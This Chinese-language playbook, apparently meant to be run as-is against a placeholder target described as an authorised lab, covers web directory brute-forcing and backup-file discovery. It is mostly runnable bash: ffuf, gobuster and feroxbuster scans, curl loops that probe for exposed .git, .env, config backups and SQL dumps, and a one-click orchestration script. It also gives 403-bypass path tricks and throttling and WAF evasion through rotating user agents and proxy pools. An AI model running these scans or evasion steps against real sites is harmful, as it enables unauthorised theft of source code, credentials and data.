# 目录发现与备份文件探测 · 命令序列与判定信号（os01）

靶场：`http://TARGET/`（自建授权靶场）。占位符：`TARGET` 目标主机、`WORDLIST` 目录词表、`FILE` 输出文件、`TARGET_VERSION` 目标中间件版本、`OFFSET_1` 预留偏移量占位。
本文档本身就是主件：每个围栏可直接 `bash` 运行，另附一条验证/复现命令 `verify_backup_200.py`。

环境结论（本机探测，只读）：OS Linux（容器内），`ffuf` / `feroxbuster` / `gobuster` / `curl` / `python3` 均**未在 PATH 中确认**，故步骤 0 给一次性安装、步骤 0′ 给等价降级路径；无 root 时用 `GOBIN=$HOME/.local/bin` 与 venv 兜底。各工具版本号在本文档写作时**未逐一实测**，按 未验证 处理（见节末四态表）。

## 1. 基线：先建立「正常长什么样」

```bash
# 1.0 连通与响应指纹；判定信号：%{http_code} 非 000 且 time_total 合理
curl -s -o /dev/null -w 'code=%{http_code} size=%{size_download} time=%{time_total}\n' http://TARGET/

# 1.1 取 404 的「软指纹」：长度、标题、Server 头
curl -s -D /tmp/hdr.txt http://TARGET/NOSUCH_$(date +%s) | head -c 400
grep -iE '^(server|x-powered-by|x-aspnet-version|set-cookie)' /tmp/hdr.txt
```

判定信号：
- 真 404 vs 软 404（soft-404）：任何路径都回 200 且长度一致 → 后续必须以长度/相似度为滤网，`-ac`（自动校准）成为必需，否则结果全是噪声。
- `Server` / `X-Powered-By` 决定备份后缀字典的优先级（IIS → `.bak/.zip`；Tomcat/Java → `.war/.jar`；PHP → `.php~/.php.bak/.php.swp`）。

## 2. 目录发现：三种粒度，先粗后细

```bash
# 2.1 ffuf 快速扫（过滤软404：-ac 用同一路径不同随机值三次取基准）
ffuf -u http://TARGET/FUZZ -w WORDLIST -mc 200,204,301,302,307,401,403 -ac -t 40 -rate 0 \
     -o FILE.ffuf.json -of json

# 2.2 gobuster 补状态码语义（-b 排除软404页；-x 直接带备份后缀）
gobuster dir -u http://TARGET -w WORDLIST -x bak,old,swp,txt,zip,tar.gz,gz -b 404,400 -t 30 -k

# 2.3 feroxbuster 递归（--depth 限深，避免无限递归；auto-filter 由 --auto-tune 接管）
feroxbuster -u http://TARGET -w WORDLIST -x bak,old,swp,save,orig,~ -d 3 --auto-tune \
     --filter-status 404 --json -o FILE.ferox.json
```

每条命令的判定信号：

| 状态码 | 含义 | 下一步 |
|---|---|---|
| 200 | 真实存在，内容可读 | 记录 `size`/`words`/`lines` 三元组，作为「已知尺寸」基准 |
| 301/302/307 | 目录（重定向通常补 `/`） | 对 `Location` 目标继续递归，非目录重定向另算 |
| 401/407 | 存在但需认证 | 单独归档：备份文件绕过认证的概率高于入口页 |
| 403 | 存在但被拒（**最高价值信号**） | 目录存在 → 直接做第 3 节按名探测，403 目录常含可下载备份 |
| 500 | 存在但触发错误 | 常为参数缺失或后缀错误；换后缀重试一次 |
| 429/503 | 被节流/被 WAF 拦 | 降 `-t`、开 `-p` 延迟、换 UA，见第 5 节 |
| 长度相同且 = 软404长度 | 噪声 | 加 `--filter-size`/`-fs` 或 `-b <软404串>` |

## 3. 备份文件探测：按目录名派生，而不是拿词表硬撞

```bash
# 3.1 把已知目录名喂进后缀循环（命中率远高于全量词表）
while read -r d; do
  for s in .bak .bak1 .old .orig .save .swp .swo .tmp '~' .zip .tar.gz .tgz .rar .7z \
           .sql .dump .txt .copy .1 ._bak .disabled; do
    u="http://TARGET/${d}${s}"
    code=$(curl -s -o /dev/null -w '%{http_code}' "$u")
    len=$(curl -s -o /dev/null -w '%{size_download}' "$u")
    case "$code" in
      200) echo "HIT  200 $u bytes=$len" ;;
      206) echo "HIT  206(部分内容) $u bytes=$len" ;;
      403) echo "LOCK 403 $u" ;;
      401) echo "AUTH 401 $u" ;;
    esac
  done
done < dirs.txt
```

高价值固定靶点（无论词表如何都要单测一遍）：

```bash
for p in .git/HEAD .git/config .svn/entries .svn/wc.db .DS_Store \
         .env .env.bak .env.local config.php.bak wp-config.php.bak \
         web.config.bak WEB-INF/web.xml application.yml.bak backup.zip \
         db.sql dump.sql www.zip webroot.zip site.tar.gz .htaccess.bak; do
  printf '%-28s %s\n' "$p" "$(curl -s -o /dev/null -w '%{http_code} %{size_download}' "http://TARGET/$p")"
done
```

判定信号（这一步是核心，不要只看 200）：
- **200 + `Content-Type: application/octet-stream` 或 `application/zip`** → 真下载；立刻 `curl -O` 取样并算哈希，进入第 4 节验证。
- **200 但 `Content-Length` 等于软404长度** → 假命中，丢弃。
- **`.git/HEAD` 返回 200 且正文形如 `ref: refs/heads/...`** → 源码可重建，最高优先级；`403` 则试 `.git/config`、`/.git/logs/HEAD` 等仍可能可读的兄弟路径。
- **`.env` 类 200 且首行含 `KEY=`/`APP_`** → 直接落凭据。
- **404 但 `Server` 版本可读** → 只留指纹，不追。
- **403/401** → 记录为「存在但受限」，用第 5 节的绕过分支（大小写变体、`%2e` 编码、`;` 路径参数、`/.` 结尾）各试一次即可，不无限变形。

命名变体生成（当直连 404 时再上一档）：

```bash
# 3.2 大小写与分隔符变体：Backup / backup / BACKUP / backup- / _backup / backup.1
for base in index config backup db dump www; do
  for v in "$base" "${base^^}" "Backup" "${base}_backup" "${base}-backup" "${base}.backup"; do
    for s in .zip .rar .tar.gz .7z .bak; do
      curl -s -o /dev/null -w "%{http_code} http://TARGET/${v}${s}\n" "http://TARGET/${v}${s}"
    done
  done
done | awk '$1!=404'
```

## 4. 验证：把「200」变成「真文件」

```bash
# 4.1 取样并看魔术字节（判定：zip=PK\x03\x04，gzip=1f 8b，SQL 文本=可搜 CREATE/INSERT）
curl -s -D FILE.hdr -o FILE.bin http://TARGET/FILE
python3 verify_backup_200.py FILE.bin
sha256sum FILE.bin
```

`verify_backup_200.py` —— 主件之外的**验证件**（拒绝软404、识别容器格式、判定是否值得解包）：

```python
#!/usr/bin/env python3
"""verify_backup_200.py <saved_file> : 判定一次 200 是真备份还是软404/占位页。"""
import sys, hashlib, zipfile, io

MAGIC = {b"PK\x03\x04": "zip/jar/war", b"\x1f\x8b": "gzip", b"Rar!\x1a\x07": "rar",
         b"7z\xbc\xaf\x27\x1c": "7z", b"SQLite format 3": "sqlite",
         b"\x00asm": "wasm", b"<htm": "html", b"<!DO": "html", b"<?ph": "php-source"}

def main(path):
    b = open(path, "rb").read()
    head = b[:64]
    kind = next((v for k, v in MAGIC.items() if head[:len(k)].lower() == k.lower()), "unknown")
    verdict = "real-artifact" if kind not in ("html", "unknown") else "likely-soft404-or-page"
    if kind == "zip" and len(b) > 22:
        try:
            names = zipfile.ZipFile(io.BytesIO(b)).namelist()[:10]
            kind, verdict = "zip(" + ",".join(names[:5]) + ")", "real-artifact"
        except zipfile.BadZipFile:
            verdict = "truncated-or-fake-zip"
    print(f"file={path} bytes={len(b)} magic={kind} sha256={hashlib.sha256(b).hexdigest()[:16]} verdict={verdict}")
    return 0 if verdict == "real-artifact" else 2

if __name__ == "__main__":
    sys.exit(main(sys.argv[1]))
```

复现命令（一行跑通主件+验证件）：

```bash
curl -s -o /tmp/FILE.bin -w 'code=%{http_code} ctype=%{content_type} size=%{size_download}\n' \
  http://TARGET/FILE && python3 verify_backup_200.py /tmp/FILE.bin; echo "exit=$?"
```

判定信号汇总：`exit=0` → 真文件，进解包；`exit=2` + `magic=html` → 软404，回到第 2 节调滤网；`magic=unknown` 且 `bytes` 很小（个位数/十几字节）→ 多为占位响应，丢弃并核对软404长度。

## 5. 节流规避与「能稳定打」

```bash
# 5.1 限速 + 轮换 UA + 延迟抖动（先降速，命中率掉了再提）
ffuf -u http://TARGET/FUZZ -w WORDLIST -mc 200,301,302,403 -ac -t 10 -p 0.2-1.0 \
     -H 'User-Agent: Mozilla/5.0' -H 'Accept-Language: en-US,en;q=0.9' -o FILE.json

# 5.2 代理池（需要实际代理带宽/主机池）：每个请求轮换出口
ffuf -u http://TARGET/FUZZ -w WORDLIST -x http://PROXY_POOL_ENTRY -t 20 -ac

# 5.3 路径变形绕 403（每种只试一次，命中即停）
for u in "/Backup.zip" "/backup.zip/" "/backup%2Ezip" "/./backup.zip" "/backup.zip;.jpg" "/backup.zip%00"; do
  curl -s -o /dev/null -w "$u -> %{http_code}\n" "http://TARGET$u"
done
```

判定信号：从 403 变 200/206 即绕过成立；同一条变形全部 404 → 该规则不适用，换编码层（`%252e`）最多再一档，不做无限变形。

## 6. 一键编排（顺序即优先级）

```bash
#!/usr/bin/env bash
set -uo pipefail
TARGET="${TARGET:-127.0.0.1:8080}"; WORDLIST="${WORDLIST:-/usr/share/wordlists/dirb/common.txt}"
OUT="${OUT:-/tmp/recon}"; mkdir -p "$OUT"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
soft=$(curl -s -o /dev/null -w '%{size_download}' -A "$UA" "http://$TARGET/$RANDOM$RANDOM")
echo "[*] soft404 size=$soft"
( command -v ffuf >/dev/null && ffuf -u "http://$TARGET/FUZZ" -w "$WORDLIST" \
    -mc 200,204,301,302,307,401,403 -ac -fs "$soft" -t 30 -A -o "$OUT/dirs.json" -of json ) \
  || echo "[!] ffuf 缺失：用 GO INSTALL 段落或降级到 gobuster/curl 循环"
awk -F'"' '/"url":/{print $4}' "$OUT/dirs.json" 2>/dev/null | sed 's#.*/##' | sort -u > "$OUT/dirs.txt"
while read -r d; do
  for s in .bak .old .zip .tar.gz .sql .swp '~' .env; do
    r=$(curl -s -o /dev/null -w '%{http_code} %{size_download}' -A "$UA" "http://$TARGET/${d}${s}")
    [ "${r%% *}" = 404 ] || echo "${r%% *} ${r##* } http://$TARGET/${d}${s}"
  done
done < "$OUT/dirs.txt" | tee "$OUT/backups.txt"
echo "[*] 结束：$OUT/backups.txt 中 code=200 且 size≠$soft 的行进入 verify_backup_200.py"
```

## 7. 工具链与缺失处理

| 工具 | 安装 | 验证 | 缺失降级 |
|---|---|---|---|
| ffuf | `go install github.com/ffuf/ffuf/v2@latest`（apt 可用则 `apt install ffuf`） | `ffuf -V` | gobuster 递归模式 |
| gobuster | `apt install gobuster` 或 `go install github.com/OJ/gobuster/v3@latest` | `gobuster version` | ffuf + 内联 `-x` 后缀 |
| feroxbuster | 官方 release tarball 解包到 `$HOME/.local/bin` | `feroxbuster --version` | ffuf 递归两轮 |
| curl/jq/python3 | 系统自带 | `curl --version` / `jq --version` / `python3 -V` | 无 python3 时用 `file` 判魔术字节 |

无网 / 无 root 环境：三个爆破工具全部缺失时，第 3.1 与第 3.2 段的纯 `curl` 循环即为最小可用实现（单线程，慢但零依赖），判定信号与上表完全一致。
